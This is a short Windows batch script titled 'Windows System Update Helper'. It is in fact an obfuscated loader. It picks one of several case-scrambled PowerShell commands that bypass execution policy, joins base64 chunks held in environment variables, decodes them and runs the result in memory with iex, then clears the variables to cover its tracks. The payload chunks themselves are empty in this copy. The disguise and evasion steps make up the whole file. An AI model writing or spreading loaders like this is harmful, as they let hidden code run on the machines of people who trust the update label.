@echo off
setlocal enabledelayedexpansion
title Windows System Update Helper

:: Environment Initialization
set "vS=Set"
set "vE=Item"
set "vR=Random"
set "vX=New"
set /a "junk=!RANDOM! %% 100 + 1"

:: Payload Chunking
set ""
set ""
set ""

:: Random Execution Path Selection
set /a "pathSel=!RANDOM! %% 3"
if !pathSel! equ 0 (
    set "cmd=powerShell -ExeC ByPAsS -NoLo -c"
) else if !pathSel! equ 1 (
    set "cmd=pOwERsHeLL -ExEc BypASs -nOP -c"
) else (
    set "cmd=powErsHelL -exe  ByPasS -nOPrO -c"
)

:: Payload Reconstruction and Execution (FIXED)
%cmd% "$b=$env:c1+$env:c2+$env:c3; iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b))"

:: Cleanup Artifacts
set c1= & set c2= & set c3=
endlocal